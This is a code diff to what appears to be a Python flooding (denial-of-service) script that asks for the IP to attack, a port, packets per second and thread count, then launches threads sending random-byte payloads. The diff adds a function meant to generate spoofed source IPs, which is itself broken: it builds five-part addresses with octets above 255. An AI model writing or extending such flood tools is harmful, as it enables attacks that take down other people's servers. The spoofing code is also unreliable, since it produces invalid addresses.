@@ -173,6 +173,22 @@ ip = str(input("[ ! ] Enter the IP you want to attack >>= "))
 port = int(input("[ ? ] Port/t >>="))
 pack = int(input("[ ? ] Packets/s >>="))
 th = int(input("Threads/t >>="))
+def randomip():
+  data4 = random._urandom(4500)
+  lol = random.choice(ref)
+  randip = [192, 168, 0, 1]
+  randip1 = random.randint(1,444)
+  randip2 = random.randint(3,555)
+  randip3 = random.randint(4,555)
+  randip4 = random.randint(5,555)
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4])
+  return (randip)
 def join():
   global useragents, ref, socks5
   hh = random._urandom(7500)
@@ -221,7 +237,7 @@ def join2():
          except:
               s.close()
               print('[+] server error')
-              
+    
 if __name__=='__main__':
  for i in range(th):
    th = threading.Thread(target=join)
